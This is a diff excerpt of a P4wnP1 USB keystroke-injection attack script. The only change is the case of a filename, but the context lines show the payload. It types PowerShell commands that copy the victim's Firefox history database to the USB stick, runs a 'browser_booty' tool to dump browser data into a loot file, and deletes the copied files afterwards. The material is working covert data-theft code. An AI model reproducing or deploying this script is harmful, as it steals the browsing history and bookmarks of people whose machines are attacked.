@@ -4,7 +4,7 @@
 #													                                                                                       #
 # PREREQUISTES:                                                                                                                            #
 # - Enable keyboard and USB mass storage capability on your P4wnP1.                                                                        #
-# - Place Browser_Booty.exe in /tools in order to extract browser data.                                                                    #
+# - Place browser_booty.exe in /tools in order to extract browser data.                                                                    #
 # - Edit global settings below to your liking.                                                                                             #
 ##########################################################################################################################################*/
 
@@ -64,7 +64,7 @@ function attack() {
     // Copying Firefox seperately because it insists on being difficult
     type('cd $env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\; ls | Sort-Object -Property LastWriteTime | Select-Object -Last 1 | cd; cp -Path "places.sqlite" -Destination "$usbPath\\F_History"\n');
     // Execute the .exe in /tools folder
-    type('cd $usbPath\\tools; .\\Browser_Booty.exe > $lootPathBrowser\\$env:COMPUTERNAME-HDB.txt\n');
+    type('cd $usbPath\\tools; .\\browser_booty.exe > $lootPathBrowser\\$env:COMPUTERNAME-HDB.txt\n');
     //Deletes the database files now that we've extracted all useful information
     type('cd ..; rm * -Include *History; rm * -Include *Bookmarks\n') 
     delay(9000)
